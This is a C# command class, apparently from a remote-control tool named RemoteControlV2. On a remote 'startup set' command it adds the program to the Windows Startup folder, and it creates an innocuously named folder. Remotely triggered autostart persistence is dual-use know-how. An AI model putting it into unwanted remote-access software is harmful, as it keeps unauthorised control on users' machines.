using RemoteControlV2.Plugins;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using IWshRuntimeLibrary;

namespace RemoteControlV2.Commands
{
    class StartupCommand : ICommand
    {
        public string Name => "startup";

        public string Syntax => "Usage: 'startup set' or 'startup remove'";

        public bool Enabled { get; set; } = true;

        public void Execute(string arguments)
        {
            if (string.IsNullOrWhiteSpace(arguments))
            {
                throw new ArgumentException();
            }
            string path = System.Reflection.Assembly.GetExecutingAssembly().CodeBase;
            switch (arguments)
            {
                case "set":
                    {
                        string lnk = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Microsoft\Windows\Start Menu\Programs\Startup\RCv2.lnk");
                        Directory.CreateDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "RemotePresentationManager"));
                        WshShell shell = new WshShell();
                        IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(lnk);
                        shortcut.Description = "r/programmerHumor";
                        shortcut.TargetPath = path;
                        shortcut.WorkingDirectory = Environment.CurrentDirectory;
                        shortcut.Save();
                        Program.Connection.SendLine("Done!");
                        break;
                    }
                case "remove":
                    {
                        string lnk = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Microsoft\Windows\Start Menu\Programs\Startup\RCv2.lnk");
                        System.IO.File.Delete(lnk);
                        Program.Connection.SendLine("Done!");
                        break;
                    }
            }

        }
    }
}
